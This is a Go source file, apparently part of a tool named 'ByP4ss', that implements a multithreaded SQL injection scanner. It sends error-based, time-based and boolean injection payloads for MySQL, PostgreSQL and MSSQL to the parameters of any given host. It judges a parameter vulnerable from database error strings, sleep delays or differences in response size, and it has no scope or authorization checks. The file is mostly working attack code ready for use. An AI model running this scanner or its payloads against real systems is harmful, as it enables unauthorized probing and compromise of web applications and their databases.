// sqliscan — motor de SQL injection do ByP4ss
// Go puro, stdlib apenas.
// Le 1 linha JSON do stdin, responde 1 linha JSON no stdout.
// Chamado por Discovery/SqliScan.py via subprocess.

package main

import (
"bufio"
"encoding/json"
"fmt"
"io"
"net"
"net/url"
"os"
"strings"
"sync"
"time"
)

type Requisicao struct {
Alvo    string   `json:"alvo"`
Porta   int      `json:"porta"`
Path    string   `json:"path"`
Params  []string `json:"params"`
Threads int      `json:"threads"`
}

type Vulneravel struct {
Param      string `json:"param"`
Payload    string `json:"payload"`
Tipo       string `json:"tipo"`
Evidencia  string `json:"evidencia"`
Status     int    `json:"status,omitempty"`
Latencia   float64 `json:"latencia,omitempty"`
Severidade string `json:"severidade"`
}

type Resposta struct {
OK         bool         `json:"ok"`
Alvo       string       `json:"alvo"`
Porta      int          `json:"porta"`
Vulneraveis []Vulneravel `json:"vulneraveis"`
Total      int          `json:"total"`
Testados   int          `json:"testados"`
DuracaoS   float64      `json:"duracao_s"`
Via        string       `json:"via"`
Motivo     string       `json:"motivo,omitempty"`
}

var PayloadsError = []string{
"'", "''", "';", "'; --", "' OR '1'='1", "' OR 1=1 --",
"' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
"') OR ('1'='1", "\" OR \"\"=\"", "` OR 1=1 --",
"') OR 1=1 --", "1' AND '1'='1", "1' AND '1'='2",
}

type PayloadTime struct {
Payload string
SGBD    string
Espera  int
}

var PayloadsTime = []PayloadTime{
{"' AND SLEEP(5) --", "mysql", 5},
{"'; SELECT pg_sleep(5) --", "postgres", 5},
{"'; WAITFOR DELAY '0:0:5' --", "mssql", 5},
{"' OR SLEEP(5) --", "mysql", 5},
{"1' AND SLEEP(5) AND '1'='1", "mysql", 5},
}

const (
PayloadBoolTrue  = "' AND 1=1 --"
PayloadBoolFalse = "' AND 1=2 --"
Timeout          = 3 * time.Second
LimiarSleep      = 4.0
LimiarBool       = 100
)

var PalavrasErro = []string{
"sql syntax", "mysql_fetch", "ora-", "postgresql",
"sqlite", "microsoft ole db", "unclosed quotation",
"syntax error", "warning: mysql", "division by zero",
"you have an error in your sql", "invalid query",
"mysql_num_rows", "pg_query", "sqlite3::",
}

type ResultadoReq struct {
OK       bool
Status   int
Tamanho  int
Latencia float64
Corpo    string
Motivo   string
}

func Testar(Alvo string, Porta int, Path string, Param string, Payload string) ResultadoReq {
Inicio := time.Now()
ValorEnc := url.QueryEscape(Payload)
Sep := "?"
if strings.Contains(Path, "?") {
Sep = "&"
}
CaminhoCompleto := fmt.Sprintf("%s%s%s=%s", Path, Sep, Param, ValorEnc)
Url := fmt.Sprintf("http://%s:%d%s", Alvo, Porta, CaminhoCompleto)
Cliente := &httpClient{Timeout: Timeout}
Req := &httpRequest{URL: Url, Host: Alvo}
return Cliente.Get(Req, Inicio)
}

type httpClient struct {
Timeout time.Duration
}

type httpRequest struct {
URL  string
Host string
}

func (c *httpClient) Get(Req *httpRequest, Inicio time.Time) ResultadoReq {
Endereco := fmt.Sprintf("%s:%d", parseHost(Req.URL), parsePort(Req.URL))
Conn, Erro := net.DialTimeout("tcp", Endereco, c.Timeout)
if Erro != nil {
return ResultadoReq{OK: false, Motivo: "conexao_falhou",
Latencia: time.Since(Inicio).Seconds()}
}
defer Conn.Close()
Conn.SetDeadline(time.Now().Add(c.Timeout))
LinhaReq := fmt.Sprintf("GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
parsePath(Req.URL), Req.Host)
_, Erro = Conn.Write([]byte(LinhaReq))
if Erro != nil {
return ResultadoReq{OK: false, Motivo: "escrita_falhou",
Latencia: time.Since(Inicio).Seconds()}
}
Buf := make([]byte, 16384)
N, _ := Conn.Read(Buf)
Lat := time.Since(Inicio).Seconds()
Dados := Buf[:N]
return ResultadoReq{
OK:       true,
Status:   parseStatus(Dados),
Tamanho:  N,
Latencia: Lat,
Corpo:    string(Dados),
}
}

func parseHost(Url string) string {
SemProto := strings.TrimPrefix(Url, "http://")
if idx := strings.Index(SemProto, ":"); idx >= 0 {
return SemProto[:idx]
}
if idx := strings.Index(SemProto, "/"); idx >= 0 {
return SemProto[:idx]
}
return SemProto
}

func parsePort(Url string) int {
SemProto := strings.TrimPrefix(Url, "http://")
if idx := strings.Index(SemProto, ":"); idx >= 0 {
Resto := SemProto[idx+1:]
if idx2 := strings.Index(Resto, "/"); idx2 >= 0 {
Resto = Resto[:idx2]
}
var Porta int
fmt.Sscanf(Resto, "%d", &Porta)
if Porta > 0 {
return Porta
}
}
return 80
}

func parsePath(Url string) string {
SemProto := strings.TrimPrefix(Url, "http://")
if idx := strings.Index(SemProto, "/"); idx >= 0 {
return SemProto[idx:]
}
return "/"
}

func parseStatus(Dados []byte) int {
if len(Dados) == 0 {
return 0
}
Linha := string(Dados)
if idx := strings.Index(Linha, "\r\n"); idx >= 0 {
Linha = Linha[:idx]
}
Partes := strings.Fields(Linha)
if len(Partes) >= 2 {
var Status int
fmt.Sscanf(Partes[1], "%d", &Status)
return Status
}
return 0
}

func AvaliarError(R ResultadoReq, Param, Payload string) *Vulneravel {
if !R.OK {
return nil
}
CorpoLower := strings.ToLower(R.Corpo)
for _, P := range PalavrasErro {
if strings.Contains(CorpoLower, P) {
return &Vulneravel{
Param: Param, Payload: truncar(Payload, 60),
Tipo: "error_based", Evidencia: P,
Status: R.Status, Severidade: "alta",
}
}
}
if R.Status >= 500 && (strings.Contains(Payload, "'") || strings.Contains(Payload, "\"")) {
return &Vulneravel{
Param: Param, Payload: truncar(Payload, 60),
Tipo: "error_5xx",
Evidencia: fmt.Sprintf("status %d", R.Status),
Status: R.Status, Severidade: "media",
}
}
return nil
}

func AvaliarTime(R ResultadoReq, Param, Payload string) *Vulneravel {
if R.OK && R.Latencia >= LimiarSleep {
return &Vulneravel{
Param: Param, Payload: truncar(Payload, 60),
Tipo: "time_based",
Evidencia: fmt.Sprintf("latencia %.2fs", R.Latencia),
Latencia: R.Latencia, Severidade: "critica",
}
}
if !R.OK && R.Motivo == "conexao_falhou" {
return nil
}
return nil
}

func AvaliarBool(RTrue, RFalse ResultadoReq, Param string) *Vulneravel {
if !RTrue.OK || !RFalse.OK {
return nil
}
Dif := RTrue.Tamanho - RFalse.Tamanho
if Dif < 0 {
Dif = -Dif
}
if Dif >= LimiarBool {
return &Vulneravel{
Param: Param,
Payload: fmt.Sprintf("%s vs %s", PayloadBoolTrue, PayloadBoolFalse),
Tipo: "boolean",
Evidencia: fmt.Sprintf("diferenca %d bytes", Dif),
Severidade: "alta",
}
}
return nil
}

func truncar(S string, Max int) string {
if len(S) <= Max {
return S
}
return S[:Max]
}

func processar(Req Requisicao) Resposta {
Inicio := time.Now()
Resp := Resposta{Alvo: Req.Alvo, Porta: Req.Porta, Via: "go"}
if Req.Path == "" {
Req.Path = "/"
}
if len(Req.Params) == 0 {
Req.Params = []string{"id", "page", "cat", "user", "q", "query", "search",
"item", "product", "article", "post", "action"}
}
if Req.Threads < 1 {
Req.Threads = 10
}
TipoTarefa := func(Tipo, Param, Payload string) {
}
_ = TipoTarefa
Tarefas := make(chan [3]string, 1024)
var Mu sync.Mutex
var Wg sync.WaitGroup
Vulneraveis := []Vulneravel{}
BoolCache := make(map[string]map[string]ResultadoReq)
var MuBool sync.Mutex
for i := 0; i < Req.Threads; i++ {
Wg.Add(1)
go func() {
defer Wg.Done()
for T := range Tarefas {
Tipo, Param, Payload := T[0], T[1], T[2]
R := Testar(Req.Alvo, Req.Porta, Req.Path, Param, Payload)
switch Tipo {
case "error":
if V := AvaliarError(R, Param, Payload); V != nil {
Mu.Lock()
Vulneraveis = append(Vulneraveis, *V)
Mu.Unlock()
}
case "time":
if V := AvaliarTime(R, Param, Payload); V != nil {
Mu.Lock()
Vulneraveis = append(Vulneraveis, *V)
Mu.Unlock()
}
case "bool_true":
MuBool.Lock()
if BoolCache[Param] == nil {
BoolCache[Param] = make(map[string]ResultadoReq)
}
BoolCache[Param]["true"] = R
MuBool.Unlock()
case "bool_false":
MuBool.Lock()
if BoolCache[Param] == nil {
BoolCache[Param] = make(map[string]ResultadoReq)
}
BoolCache[Param]["false"] = R
MuBool.Unlock()
}
}
}()
}
Count := 0
for _, Param := range Req.Params {
for _, Payload := range PayloadsError {
Tarefas <- [3]string{"error", Param, Payload}
Count++
}
for _, PT := range PayloadsTime {
Tarefas <- [3]string{"time", Param, PT.Payload}
Count++
}
Tarefas <- [3]string{"bool_true", Param, PayloadBoolTrue}
Count++
Tarefas <- [3]string{"bool_false", Param, PayloadBoolFalse}
Count++
}
close(Tarefas)
Wg.Wait()
for Param, Cache := range BoolCache {
if V := AvaliarBool(Cache["true"], Cache["false"], Param); V != nil {
Vulneraveis = append(Vulneraveis, *V)
}
}
Resp.Vulneraveis = Vulneraveis
Resp.Total = len(Vulneraveis)
Resp.Testados = Count
Resp.DuracaoS = time.Since(Inicio).Seconds()
Resp.OK = true
return Resp
}

func main() {
Leitor := bufio.NewReader(os.Stdin)
Linha, Erro := Leitor.ReadString('\n')
if Erro != nil && Erro != io.EOF {
Resp := Resposta{OK: false, Motivo: "leitura_falhou"}
B, _ := json.Marshal(Resp)
fmt.Println(string(B))
return
}
Linha = strings.TrimSpace(Linha)
if Linha == "" {
Resp := Resposta{OK: false, Motivo: "input_vazio"}
B, _ := json.Marshal(Resp)
fmt.Println(string(B))
return
}
var Req Requisicao
if Erro := json.Unmarshal([]byte(Linha), &Req); Erro != nil {
Resp := Resposta{OK: false, Motivo: "json_invalido", Via: "go"}
B, _ := json.Marshal(Resp)
fmt.Println(string(B))
return
}
Resp := processar(Req)
B, _ := json.Marshal(Resp)
fmt.Println(string(B))
}
